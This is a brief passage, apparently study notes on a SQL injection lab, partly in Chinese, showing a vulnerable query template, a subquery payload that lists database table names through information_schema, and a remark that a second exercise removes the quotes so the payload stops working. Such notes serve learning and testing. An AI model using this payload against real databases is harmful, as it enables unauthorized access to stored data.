select * from [table_name] where id = 'input_id' limit 0,1

(select group_concat(table_name) from information_schema.tables where table_schema=database())

2.和第一题一样，主要就是改了下查询语句的格式

select * from [table_name] where id = input_id limit 0,1

去掉了引号，上文的payload就失去了效果
